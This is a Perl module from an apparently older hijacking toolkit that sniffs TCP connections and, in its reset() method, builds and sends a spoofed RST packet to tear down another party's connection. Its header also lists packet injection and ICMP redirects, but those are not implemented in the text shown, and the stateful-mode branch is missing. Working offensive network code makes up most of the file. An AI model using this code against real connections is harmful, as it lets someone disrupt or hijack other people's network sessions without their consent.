package hijack_stc;

# Module to store all the hijacking stuff
# This modul can be run in stateful or stateless mode
# Currently it only supports TCP hijacking methods like:
# - injecting a packet
# - greet the victim client
# - resetting a connection
# - create and send a ICMP redirect message
#
# For more information please read the POD documentation
#
# Programmed by Bastian Ballmann and Stefan Krecher
#
# Last Update: 09.11.2003
#
# This program is free software; you can redistribute
# it and/or modify it under the terms of the
# GNU General Public License version 2 as published
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will
# be useful, but WITHOUT ANY WARRANTY; without even
# the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.



###[ Loading modules ]###

use NetPacket::Ethernet qw(:strip); # Decoding ethernet packets
use NetPacket::IP qw(:strip);       # Decoding IP packets
use NetPacket::TCP;                 # Decoding TCP packets
use Net::RawIP;                     # Creating raw packets


###[ Konstruktor ]###

# Erstellt aus einer Net::PcapUtils Paket Referenz ein Hijack Objekt
# Zur Zeit wird nur TCP/IP unterstuetzt
# Default Modus ist stateless.
# Es wird also per default nicht zwischen Server und Client unterschieden
# Parameter: Pcap packet object
sub new
{
    my ($class, $packet) = @_;
    my $obj = {};

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{src_ip} = $ip->{src_ip};         # Current source ip (stateless mode)
    $obj->{dest_ip} = $ip->{dest_ip};       # Current destination ip (stateless mode)
    $obj->{src_port} = $tcp->{src_port};    # Current source port (stateless mode)
    $obj->{dest_port} = $tcp->{dest_port};  # Current destination port (stateless mode)
    $obj->{seqnum} = $tcp->{seqnum};        # Current sequence number (stateless mode)
    $obj->{acknum} = $tcp->{acknum};        # Current acknowledgement number (stateless mode)
    $obj->{flags} = $tcp->{flags};          # Current TCP flags
    $obj->{hijacked} = [];                  # Array to store hijacked connections
    $obj->{login_flag} = 0;                 # Flag to remember if we have seen a correct login process
    $obj->{stateful} = 0;                   # Flag to remember if we run in stateless or stateful mode
    $obj->{server_ip} = "";                 # Server IP (stateful mode)
    $obj->{client_ip} = "";                 # Client IP (stateful mode)
    $obj->{server_port} = "";               # Server Port (stateful mode)
    $obj->{client_port} = "";               # Client Port (stateful mode)
    $obj->{server_seq} = "";                # Server Sequence Nummer (stateful mode)
    $obj->{server_ack} = "";                # Server Acknowledgement Nummer (stateful mode)
    $obj->{client_seq} = "";                # Client Sequence Nummer (stateful mode)
    $obj->{client_ack} = "";                # Client Acknowledgement Nummer (stateful mode)

    return bless($obj,$class);
}



###[ General methods ]###

# Methode update() updated die Objekt Eigenschaften mit den Eigenschaften
# aus einem Net::PcapUtils Paket Objekt
# Diese Methode updated die Verbindungsinformationen im stateless Modus
sub update
{
    my ($obj, $packet) = @_;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{src_ip} = $ip->{src_ip};
    $obj->{dest_ip} = $ip->{dest_ip};
    $obj->{src_port} = $tcp->{src_port};
    $obj->{dest_port} = $tcp->{dest_port};
    $obj->{seqnum} = $tcp->{seqnum};
    $obj->{acknum} = $tcp->{acknum};
    $obj->{flags} = $tcp->{flags};

    return $obj;
}

###[ HIJACKING METHODS ]###



# Create and send a Reset packet
# The first parameter to pass is a reset flag (RST|FIN)
# the second one is only necessary in stateful mode and
# tells the target direction (client|server)
sub reset
{
    my $obj = shift;
    my $flag = shift;
    my $target = shift;
    my $packet = new Net::RawIP;
    my($src_ip,$dest_ip,$src_port,$dest_port,$seqnum,$acknum);

    $flag = lc($flag);
# Are we running in stateful mode?

	$src_ip = $obj->{dest_ip};
	$dest_ip = $obj->{src_ip};
	$src_port = $obj->{dest_port};
	$dest_port = $obj->{src_port};
	$seqnum = $obj->{acknum};
	$acknum = $obj->{acknum};


# Create the packet
	$packet->set({
	    ip => {
		saddr => $src_ip,
		daddr => $dest_ip
	    },
	    tcp => {
		source => $src_port,
		dest => $dest_port,
		rst => 1,
		seq => $seqnum,
		ack_seq => $acknum
	    }
	});


# ...and throw it on the wire!
  $packet->send(0,1);
}



1;


